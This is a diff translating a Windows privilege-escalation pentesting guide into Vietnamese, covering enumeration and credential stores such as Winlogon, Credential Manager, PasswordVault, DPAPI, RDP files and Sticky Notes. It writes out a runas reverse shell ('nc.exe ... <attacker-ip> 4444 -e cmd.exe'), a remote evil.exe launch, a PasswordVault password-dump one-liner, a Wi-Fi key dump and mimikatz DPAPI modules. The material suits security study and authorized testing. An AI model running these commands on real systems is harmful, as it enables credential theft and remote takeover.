+Đối với listener cục bộ, xác định chủ sở hữu process, đường dẫn executable và service hoặc scheduled task khởi chạy nó bằng cách đối chiếu PID. Remote-control service chỉ có thể cấp quyền truy cập với tư cách người dùng desktop nếu các cơ chế xác thực và kiểm soát lệnh của nó cho phép. Ứng dụng TCP tùy chỉnh chạy dưới tài khoản có đặc quyền cao hơn là một mục tiêu cần đánh giá riêng: listener và đường dẫn binary chỉ là manh mối thụ động, còn khả năng khai thác memory corruption đã xác thực đòi hỏi phân tích chính binary đó cùng đầu vào mà nó có thể tiếp nhận. Nếu một port đang mở có vẻ thuộc về process hệ thống, hãy đối chiếu với [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) trước khi xác định service backend; chỉ riêng quy tắc chuyển tiếp không chứng minh được đích có thể truy cập hoặc dễ bị tấn công.
 
-### Routing Table
+### Bảng định tuyến
 
 ```
 route print
 Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
 ```
 
-### ARP Table
+### Bảng ARP
 
 ```
 arp -A
 Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
 ```
 
-### Firewall Rules
+### Quy tắc Firewall
 
-[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(list rules, create rules, turn off, turn off...)**
+[**Xem trang này để biết các lệnh liên quan đến Firewall**](../basic-cmd-for-pentesters.md#firewall) **(liệt kê quy tắc, tạo quy tắc, tắt, tắt...)**
 
-More[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)
+Xem thêm[ các lệnh liệt kê mạng tại đây](../basic-cmd-for-pentesters.md#network)
 
-### Windows Subsystem for Linux (wsl)
+### Hệ thống con Windows dành cho Linux (wsl)
 
 ```bash
 C:\Windows\System32\bash.exe
 C:\Windows\System32\wsl.exe
 ```
 
-Binary `bash.exe` can also be found in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`
+Tệp nhị phân `bash.exe` cũng có thể được tìm thấy tại `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`
 
-If you get root user you can listen on any port (the first time you use `nc.exe` to listen on a port it will ask via GUI if `nc` should be allowed by the firewall).
+Nếu có quyền root, bạn có thể lắng nghe trên bất kỳ cổng nào (lần đầu dùng `nc.exe` để lắng nghe trên một cổng, GUI sẽ hỏi liệu có cho phép `nc` qua firewall hay không).
 
 ```bash
 wsl whoami
@@ -1363,15 +1362,15 @@ wsl whoami
 wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
 ```
 
-To easily start bash as root, you can try `--default-user root`
+Để dễ dàng khởi chạy bash với quyền root, bạn có thể thử `--default-user root`
 
-You can explore the `WSL` filesystem in the folder `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`
+Bạn có thể khám phá hệ thống tệp `WSL` trong thư mục `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`
 
-Linux `root` inside WSL does not by itself grant Windows Administrator rights. If the current Windows identity can read a distribution's filesystem, review shell-history files (including `/root/.bash_history`) for commands that may have recorded credentials; escalation still requires a valid higher-privilege account and an allowed authentication path. The `LocalState\rootfs` layout applies to older WSL installations; WSL 2 commonly stores the distribution in an [`ext4.vhdx` virtual disk](https://learn.microsoft.com/en-us/windows/wsl/disk-space), so first identify the actual distribution and storage path. Avoid printing history contents during automated enumeration.
+Tài khoản `root` trong Linux chạy bên trong WSL không tự cấp quyền Windows Administrator. Nếu danh tính Windows hiện tại có thể đọc hệ thống tệp của một bản phân phối, hãy kiểm tra các tệp lịch sử shell (bao gồm `/root/.bash_history`) để tìm các lệnh có thể đã ghi lại thông tin xác thực; việc leo thang quyền vẫn cần một tài khoản có quyền cao hơn hợp lệ và một phương thức xác thực được cho phép. Bố cục `LocalState\rootfs` áp dụng cho các bản cài đặt WSL cũ; WSL 2 thường lưu bản phân phối trong một đĩa ảo [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), vì vậy trước tiên hãy xác định bản phân phối và đường dẫn lưu trữ thực tế. Tránh in nội dung lịch sử lệnh trong quá trình liệt kê tự động.
 
-## Windows Credentials
+## Thông tin xác thực Windows
 
-### Winlogon Credentials
+### Thông tin xác thực Winlogon
 
 ```bash
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
@@ -1385,18 +1384,18 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDef
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
 ```
 
-Treat `DefaultUserName` and `DefaultDomainName` as account context, not credentials. A nonempty `DefaultPassword` or `AltDefaultPassword` value is a plaintext registry finding. If `AutoAdminLogon=1` but no plaintext password is readable, that is only a lead: [Sysinternals Autologon can store the password as an LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), and ordinary registry reads do not establish whether that secret exists or can be retrieved. Review access rights and the actual logon configuration before reporting a credential exposure.
+Treat `DefaultUserName` và `DefaultDomainName` là thông tin ngữ cảnh tài khoản, không phải thông tin xác thực. Giá trị `DefaultPassword` hoặc `AltDefaultPassword` không rỗng là một phát hiện về mật khẩu dạng plaintext trong registry. Nếu `AutoAdminLogon=1` nhưng không đọc được mật khẩu dạng plaintext, thì đây chỉ là manh mối: [Sysinternals Autologon can store the password as an LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), và việc đọc registry thông thường không xác định được liệu secret đó có tồn tại hoặc có thể truy xuất hay không. Hãy xem xét quyền truy cập và cấu hình đăng nhập thực tế trước khi báo cáo việc lộ thông tin xác thực.
 
-### Credentials manager / Windows vault
+### Trình quản lý thông tin xác thực / Windows vault
 
-From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
-Windows Vault stores user credentials for servers, websites, and other programs that **Windows** can use to **log users in automatically**. At first, this might sound as though users can store credentials for sites such as Facebook, Twitter, or Gmail and have browsers log in automatically, but that is not how it works.
+Từ [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
+Windows Vault lưu trữ thông tin xác thực cho máy chủ, website và các chương trình khác mà **Windows** có thể dùng để **tự động đăng nhập người dùng**. Thoạt nghe, có thể nghĩ rằng người dùng có thể lưu thông tin xác thực cho các trang như Facebook, Twitter hoặc Gmail để trình duyệt tự động đăng nhập, nhưng thực tế không phải vậy.
 
-Windows Vault stores credentials that Windows can log in the users automatically, which means that any **Windows application that needs credentials to access a resource** (server or a website) **can make use of this Credential Manager** & Windows Vault and use the credentials supplied instead of users entering the username and password all the time.
+Windows Vault lưu trữ thông tin xác thực mà Windows có thể dùng để tự động đăng nhập người dùng. Điều này có nghĩa là mọi **ứng dụng Windows cần thông tin xác thực để truy cập tài nguyên** (máy chủ hoặc website) **đều có thể sử dụng Credential Manager** và Windows Vault, rồi dùng thông tin xác thực được cung cấp thay vì yêu cầu người dùng nhập tên người dùng và mật khẩu mỗi lần.
 
-Unless the applications interact with Credential Manager, I don't think it is possible for them to use the credentials for a given resource. So, if your application wants to make use of the vault, it should somehow **communicate with the credential manager and request the credentials for that resource** from the default storage vault.
+Trừ khi các ứng dụng tương tác với Credential Manager, tôi không nghĩ chúng có thể sử dụng thông tin xác thực cho một tài nguyên cụ thể. Vì vậy, nếu ứng dụng muốn sử dụng vault, nó cần **giao tiếp với credential manager và yêu cầu thông tin xác thực cho tài nguyên đó** từ vault lưu trữ mặc định.
 
-Use the `cmdkey` to list the stored credentials on the machine.
+Dùng `cmdkey` để liệt kê thông tin xác thực được lưu trữ trên máy.
 
 ```bash
 cmdkey /list
@@ -1406,25 +1405,25 @@ Currently stored credentials:
  User: WORKGROUP\Administrator
 ```
 
-Then you can use `runas` with the `/savecred` options in order to use the saved credentials. The following example is calling a remote binary via an SMB share.
+Sau đó, bạn có thể dùng `runas` với tùy chọn `/savecred` để sử dụng thông tin xác thực đã lưu. Ví dụ sau gọi một binary từ xa thông qua SMB share.
 
 ```bash
 runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
 ```
 
-Using `runas` with a provided set of credential.
+Sử dụng `runas` với một bộ thông tin xác thực được cung cấp.
 
 ```bash
 C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
 ```
 
-Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).
+Lưu ý rằng có thể dùng mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) hoặc module Powershell [Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).
 
 ### UWP PasswordVault / Credential Locker
 
-Modern Windows UWP applications, Microsoft Edge, and modern system services store authentication tokens and plaintext passwords inside the Universal Windows Platform (UWP) `PasswordVault` (also exposed as `Web Credentials` in `vaultcmd`). This storage space is session-isolated and can be decrypted natively without administrative or `SeDebugPrivilege` rights.
+Các ứng dụng UWP hiện đại của Windows, Microsoft Edge và các dịch vụ hệ thống hiện đại lưu token xác thực và mật khẩu dạng văn bản thuần bên trong `PasswordVault` của Universal Windows Platform (UWP) (cũng hiển thị dưới tên `Web Credentials` trong `vaultcmd`). Không gian lưu trữ này được cô lập theo phiên và có thể được giải mã trực tiếp mà không cần quyền quản trị hoặc `SeDebugPrivilege`.
 
-Execute this PowerShell command inside the user's active session to instantly dump and decrypt all stored usernames and plaintext passwords:
+Thực thi lệnh PowerShell này trong phiên đang hoạt động của người dùng để ngay lập tức trích xuất và giải mã tất cả tên người dùng cùng mật khẩu dạng văn bản thuần đã lưu:
 
 ```ps1
 [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
@@ -1432,20 +1431,20 @@ Execute this PowerShell command inside the user's active session to instantly du
 
 ### DPAPI
 
-The **Data Protection API (DPAPI)** provides a method for symmetric encryption of data, predominantly used within the Windows operating system for the symmetric encryption of asymmetric private keys. This encryption leverages a user or system secret to significantly contribute to entropy.
+**Data Protection API (DPAPI)** cung cấp phương thức mã hóa dữ liệu đối xứng, chủ yếu được sử dụng trong hệ điều hành Windows để mã hóa đối xứng các khóa riêng tư bất đối xứng. Cơ chế mã hóa này sử dụng bí mật của người dùng hoặc hệ thống để góp phần đáng kể vào entropy.
 
-**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**. In scenarios involving system encryption, it utilizes the system's domain authentication secrets.
+**DPAPI cho phép mã hóa khóa thông qua khóa đối xứng được tạo ra từ thông tin đăng nhập bí mật của người dùng**. Trong các trường hợp mã hóa hệ thống, cơ chế này sử dụng thông tin bí mật xác thực miền của hệ thống.
 
-Encrypted user RSA keys, by using DPAPI, are stored in the `%APPDATA%\Microsoft\Protect\{SID}` directory, where `{SID}` represents the user's [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **The DPAPI key, co-located with the master key that safeguards the user's private keys in the same file**, typically consists of 64 bytes of random data. (It's important to note that access to this directory is restricted, preventing listing its contents via the `dir` command in CMD, though it can be listed through PowerShell).
+Các khóa RSA của người dùng đã được mã hóa bằng DPAPI được lưu trong thư mục `%APPDATA%\Microsoft\Protect\{SID}`, trong đó `{SID}` đại diện cho [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) của người dùng. **Khóa DPAPI, nằm cùng với khóa chính bảo vệ các khóa riêng tư của người dùng trong cùng một tệp**, thường gồm 64 byte dữ liệu ngẫu nhiên. (Lưu ý rằng quyền truy cập vào thư mục này bị hạn chế, nên không thể liệt kê nội dung bằng lệnh `dir` trong CMD, nhưng có thể liệt kê bằng PowerShell).
 
 ```bash
 Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
 ```
 
-You can use **mimikatz module** `dpapi::masterkey` with the appropriate arguments (`/pvk` or `/rpc`) to decrypt it.
+Bạn có thể dùng **mimikatz module** `dpapi::masterkey` với các tham số phù hợp (`/pvk` hoặc `/rpc`) để giải mã nó.
 
-The **credentials files protected by the master password** are usually located in:
+**Các tệp thông tin xác thực được bảo vệ bằng master password** thường nằm ở:
 
 ```bash
 dir C:\Users\username\AppData\Local\Microsoft\Credentials\
@@ -1454,21 +1453,21 @@ Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
 
-You can use **mimikatz module** `dpapi::cred` with the appropriate `/masterkey` to decrypt.\
-You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).
+Bạn có thể dùng **module mimikatz** `dpapi::cred` cùng với `/masterkey` phù hợp để giải mã.\
+Bạn có thể **trích xuất nhiều** **masterkey DPAPI** từ **memory** bằng module `sekurlsa::dpapi` (nếu bạn có quyền root).
 
 
 {{#ref}}
 dpapi-extracting-passwords.md
 {{#endref}}
 
-### PowerShell Credentials
+### Thông tin xác thực PowerShell
 
-**PowerShell credentials** are often used for **scripting** and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using **DPAPI**, which typically means they can only be decrypted by the same user on the same computer they were created on.
+**Thông tin xác thực PowerShell** thường được dùng cho các tác vụ **scripting** và tự động hóa, nhằm lưu trữ thông tin xác thực đã mã hóa một cách thuận tiện. Thông tin xác thực được bảo vệ bằng **DPAPI**, thường có nghĩa là chỉ cùng người dùng trên cùng máy tính đã tạo chúng mới có thể giải mã.
 
-An exported credential can have an arbitrary filename or `.xml` path. When a script or file inventory points to one, resolve the account's actual profile directory rather than assuming `C:\Users`: [Windows can place profiles elsewhere](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). A readable file is only a lead; [Windows `Export-Clixml` binds an encrypted credential to the exporting user and computer](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), and any recovered account must separately have valid rights on the intended service. Inspect paths and ACLs first, without printing encrypted or plaintext values during routine enumeration.
+Tệp thông tin xác thực đã xuất có thể mang tên bất kỳ hoặc có đường dẫn `.xml`. Khi script hoặc danh sách kiểm kê tệp trỏ đến một tệp, hãy xác định thư mục hồ sơ thực tế của tài khoản thay vì mặc định là `C:\Users`: [Windows có thể đặt hồ sơ ở nơi khác](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Tệp có thể đọc được chỉ là manh mối; [Windows `Export-Clixml` liên kết thông tin xác thực đã mã hóa với người dùng và máy tính thực hiện thao tác xuất](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), và mọi tài khoản khôi phục được vẫn phải có quyền hợp lệ trên dịch vụ dự định sử dụng. Trước tiên, hãy kiểm tra đường dẫn và ACL mà không in các giá trị đã mã hóa hoặc dạng rõ trong quá trình liệt kê thông thường.
 
-To **decrypt** a PS credentials from the file containing it you can do:
+Để **giải mã** thông tin xác thực PS từ tệp chứa chúng, bạn có thể thực hiện như sau:
 
 ```bash
 PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
@@ -1492,46 +1491,46 @@ netsh wlan show profile <SSID> key=clear
 cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
 ```
 
-### Saved RDP Connections
+### Các kết nối RDP đã lưu
 
-You can find them on `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
-and in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`
+Bạn có thể tìm thấy chúng tại `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
+và tại `HKCU\Software\Microsoft\Terminal Server Client\Servers`
 
-### Recently Run Commands
+### Các lệnh đã chạy gần đây
 
 ```
 HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 ```
 
-### **Remote Desktop Credential Manager**
+### **Trình quản lý thông tin xác thực Remote Desktop**
 
 ```
 %localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
 ```
 
-Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
-You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module
+Use module `dpapi::rdg` của **Mimikatz** với `/masterkey` phù hợp để **giải mã mọi file .rdg**\
+Bạn có thể **trích xuất nhiều DPAPI masterkey** từ bộ nhớ bằng module `sekurlsa::dpapi` của Mimikatz
 
-**mRemoteNG uses a different connection store.** Inspect readable XML under `%APPDATA%\mRemoteNG` and user Documents, including files with ordinary names such as `config.xml`. Identify the connection schema and encrypted `Password` attributes before treating an XML file as a credential lead. The stored value is not a DPAPI/RDCMan password; recovery depends on the file's encryption settings and whether a custom master password was used. Avoid printing encrypted values during broad enumeration.
+**mRemoteNG sử dụng một kho lưu trữ kết nối khác.** Kiểm tra các file XML có thể đọc được trong `%APPDATA%\mRemoteNG` và thư mục Documents của người dùng, bao gồm cả các file có tên thông thường như `config.xml`. Xác định schema kết nối và các thuộc tính `Password` được mã hóa trước khi coi file XML là manh mối về thông tin xác thực. Giá trị được lưu không phải mật khẩu DPAPI/RDCMan; việc khôi phục phụ thuộc vào cài đặt mã hóa của file và việc có sử dụng mật khẩu master tùy chỉnh hay không. Tránh in các giá trị đã mã hóa khi liệt kê diện rộng.
 
-**Remote Desktop Plus profile exports** may also be readable in user directories or a shared administration folder. A legacy `profiles.xml` export has `Data/Profile` entries with `ProfileName`, `Password`, and `Secure` elements. Treat a nonempty password element as a credential lead, without printing it or assuming it is plaintext: [the vendor notes](https://www.donkz.nl/) that profile protection can be bound to the creating account and computer, or configured less strictly. Confirm the file's origin and recovery conditions before relying on it.
+**Các bản xuất profile Remote Desktop Plus** cũng có thể đọc được trong thư mục người dùng hoặc thư mục quản trị dùng chung. Bản xuất `profiles.xml` cũ có các mục `Data/Profile` với phần tử `ProfileName`, `Password` và `Secure`. Coi phần tử mật khẩu không rỗng là manh mối về thông tin xác thực, nhưng không in giá trị đó hoặc mặc định rằng nó là văn bản thuần: [ghi chú của nhà cung cấp](https://www.donkz.nl/) cho biết tính năng bảo vệ profile có thể được liên kết với tài khoản và máy tính đã tạo profile, hoặc được cấu hình ít nghiêm ngặt hơn. Xác minh nguồn gốc file và điều kiện khôi phục trước khi dựa vào nó.
 
 ### Sticky Notes
 
-People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.
+Mọi người thường dùng ứng dụng StickyNotes trên máy trạm Windows để **lưu mật khẩu** và thông tin khác mà không nhận ra đây là một file cơ sở dữ liệu. File này nằm tại `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` và luôn đáng để tìm kiếm và kiểm tra.
 
-People sometimes save passwords and other information in sticky-note applications. Microsoft's packaged Sticky Notes app commonly stores notes at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; older or different apps may use other user-profile stores, including LevelDB. Identify the installed app and storage format before treating a missing SQLite file as absence of notes.
+Đôi khi mọi người lưu mật khẩu và thông tin khác trong các ứng dụng ghi chú dán. Ứng dụng Sticky Notes dạng gói của Microsoft thường lưu ghi chú tại `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; các ứng dụng cũ hơn hoặc khác có thể dùng những kho lưu trữ khác trong hồ sơ người dùng, bao gồm LevelDB. Hãy xác định ứng dụng đã cài đặt và định dạng lưu trữ trước khi coi việc không tìm thấy file SQLite là bằng chứng không có ghi chú.
 
-If Sticky Notes is using SQLite write-ahead logging, a copy of `plum.sqlite` alone can omit recent committed notes. Keep the matching `plum.sqlite-wal` with a consistent copy of the database, and include `plum.sqlite-shm` when available; the shared-memory index can be rebuilt, but the WAL is part of the database's persistent state. See [SQLite's WAL documentation](https://www.sqlite.org/wal.html). A note containing an account name or password is only a credential lead: verify the account, permitted access, and password reuse separately. An encrypted password-manager record additionally requires its actual decryption key and application-specific interpretation before it can establish a higher-privilege login.
+Nếu Sticky Notes đang sử dụng SQLite write-ahead logging, chỉ sao chép `plum.sqlite` có thể bỏ sót các ghi chú mới được xác nhận. Hãy giữ lại `plum.sqlite-wal` tương ứng cùng với bản sao nhất quán của cơ sở dữ liệu, đồng thời giữ cả `plum.sqlite-shm` nếu có; chỉ mục bộ nhớ dùng chung có thể được dựng lại, nhưng WAL là một phần trạng thái lâu dài của cơ sở dữ liệu. Xem [tài liệu WAL của SQLite](https://www.sqlite.org/wal.html). Ghi chú có chứa tên tài khoản hoặc mật khẩu chỉ là manh mối về thông tin xác thực: hãy xác minh riêng tài khoản, quyền truy cập được phép và việc dùng lại mật khẩu. Một bản ghi trình quản lý mật khẩu đã mã hóa còn cần khóa giải mã thực tế và cách diễn giải riêng của ứng dụng trước khi có thể xác nhận một thông tin đăng nhập có đặc quyền cao hơn.
 
 ### AppCmd.exe
 
-**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
-**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
-If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.
+**Lưu ý rằng để khôi phục mật khẩu từ AppCmd.exe, bạn cần có quyền Administrator và chạy ở mức High Integrity.**\
+**AppCmd.exe** nằm trong thư mục `%systemroot%\system32\inetsrv\`.\
+Nếu file này tồn tại, có thể một số **thông tin xác thực** đã được cấu hình và có thể **khôi phục**.
 
-This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
+Đoạn mã này được trích từ [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
 
 ```bash
 function Get-ApplicationHost {
@@ -1613,8 +1612,8 @@ function Get-ApplicationHost {
 
 ### SCClient / SCCM
 
-Check if `C:\Windows\CCM\SCClient.exe` exists .\
-Installers are **run with SYSTEM privileges**, many are vulnerable to **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
+Kiểm tra xem `C:\Windows\CCM\SCClient.exe` có tồn tại không .\
+Các trình cài đặt được **chạy với đặc quyền SYSTEM**, nhiều trình dễ bị **DLL Sideloading (Thông tin từ** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
 
 ```bash
 $result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
@@ -1622,79 +1621,79 @@ if ($result) { $result }
 else { Write "Not Installed." }
 ```
 
-## Files and Registry (Credentials)
+## Tệp và Registry (Thông tin xác thực)
 
-### Support-tool registry credential artifacts
+### Artifact thông tin xác thực trong registry của công cụ hỗ trợ
 
-Some older remote-support installations retain password-related value names under fixed application registry keys. For example, TeamViewer's `SecurityPasswordAES` identified a configured static session password in versions before 9, according to the [vendor's registry-key explanation](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). A value-name marker is only a review lead: verify the installed version, readable value data, format and current authentication behavior before assessing that credential. Moving from a remote-support password to a more privileged Windows account additionally requires actual password reuse and authorization for that account. Keep ciphertext and recovered passwords out of routine enumeration output.
+Một số bản cài đặt hỗ trợ từ xa cũ giữ các tên value liên quan đến mật khẩu dưới những registry key cố định của ứng dụng. Ví dụ, theo [giải thích về registry key của nhà cung cấp](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988), `SecurityPasswordAES` của TeamViewer xác định mật khẩu phiên tĩnh đã cấu hình ở các phiên bản trước 9. Dấu hiệu từ tên value chỉ là đầu mối để xem xét: hãy xác minh phiên bản đã cài đặt, dữ liệu value có thể đọc được, định dạng và hành vi xác thực hiện tại trước khi đánh giá thông tin xác thực đó. Việc chuyển từ mật khẩu hỗ trợ từ xa sang tài khoản Windows có đặc quyền cao hơn còn đòi hỏi mật khẩu thực sự được dùng lại và tài khoản đó cho phép truy cập. Không đưa ciphertext và mật khẩu đã khôi phục vào kết quả liệt kê thông thường.
 
-### Shared spreadsheets with protected sheets
+### Bảng tính dùng chung có trang tính được bảo vệ
 
-If a readable shared workbook is suspected of holding account data, distinguish **file encryption** from worksheet protection or hidden columns. [Microsoft states](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) that worksheet protection controls editing and is not a security feature; it does not by itself establish that the workbook contents are encrypted. Review only authorized, relevant files and avoid printing candidate secrets during broad enumeration. A readable `.xlsx` path, a protected sheet, or a hidden column alone does not prove that credentials exist or that any account has higher privileges; verify the actual data and current account rights separately.
+Nếu nghi ngờ một workbook dùng chung có thể đọc được chứa dữ liệu tài khoản, hãy phân biệt **mã hóa tệp** với bảo vệ trang tính hoặc cột bị ẩn. [Microsoft nêu](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) rằng bảo vệ trang tính kiểm soát việc chỉnh sửa chứ không phải tính năng bảo mật; bản thân nó không chứng minh nội dung workbook đã được mã hóa. Chỉ xem xét các tệp có liên quan mà bạn được phép truy cập, và tránh in các bí mật tiềm năng trong quá trình liệt kê diện rộng. Chỉ riêng đường dẫn `.xlsx` có thể đọc được, trang tính được bảo vệ hoặc cột bị ẩn không chứng minh rằng có thông tin xác thực hay tài khoản nào có đặc quyền cao hơn; hãy xác minh riêng dữ liệu thực tế và quyền hiện tại của tài khoản.
 
-### CI server retained change patches
+### Bản vá thay đổi được CI server lưu lại
 
-A CI server may retain submitted source changes under its data directory even after the build finishes. [TeamCity documents](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` as storage for remote-run changes; the data directory can be configured and is not necessarily under `ProgramData`. A readable patch can preserve removed or added references to a credential file, an encryption key, or a script that uses both. For example, a PowerShell `ConvertTo-SecureString -Key` workflow needs the AES key as well as the encrypted string; [Microsoft documents](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) that the key is supplied separately. Review only accessible patch names first, then inspect relevant content under authorization without printing secrets in routine enumeration output. A patch path, an encrypted value, or a key reference alone does not prove a valid credential or higher-privilege access. Restrict data-directory ACLs and avoid committing secrets to build changes.
+CI server có thể lưu các thay đổi mã nguồn đã gửi trong thư mục dữ liệu ngay cả sau khi build hoàn tất. [TeamCity ghi rõ](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` là nơi lưu trữ các thay đổi từ remote-run; thư mục dữ liệu có thể được cấu hình và không nhất thiết nằm dưới `ProgramData`. Bản vá có thể đọc được có thể lưu lại tham chiếu đã bị xóa hoặc được thêm vào cho tệp thông tin xác thực, khóa mã hóa hoặc script sử dụng cả hai. Ví dụ, quy trình PowerShell `ConvertTo-SecureString -Key` cần cả AES key lẫn chuỗi đã mã hóa; [Microsoft ghi rõ](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) rằng key được cung cấp riêng. Trước tiên, chỉ xem tên các bản vá có thể truy cập; sau đó, khi được phép, kiểm tra nội dung liên quan mà không in bí mật trong kết quả liệt kê thông thường. Chỉ riêng đường dẫn bản vá, giá trị đã mã hóa hoặc tham chiếu đến key không chứng minh thông tin xác thực hợp lệ hay quyền truy cập cao hơn. Hạn chế ACL của thư mục dữ liệu và tránh commit bí mật vào các thay đổi build.
 
-### Custom local administrator password rotation
+### Xoay vòng mật khẩu administrator cục bộ tùy chỉnh
 
-A homegrown password rotator may store an encrypted local administrator password in a local service while keeping its datastore credentials in a readable `.env` file or beside the updater binary. Review the updater's scheduled task, account, configuration ACLs, listener, and datastore permissions together. A loopback-only datastore is still reachable to a local user who has valid credentials, but authentication alone does not prove permission to read the relevant records. If the encryption seed or key material is accessible beside the ciphertext, review the exact key derivation before trusting the encryption. A scheme that deterministically derives an AES key from an exposed seed using Go's [`math/rand`](https://pkg.go.dev/math/rand) is unsuitable for protecting that password; Go documents that package as inappropriate for security-sensitive randomness. Confirm that any recovered password is current and belongs to a local Administrators-group account before treating it as an escalation path. A scheduled task, `.env` path, or encrypted blob alone proves none of those conditions. Keep passwords and key material out of routine enumeration output.
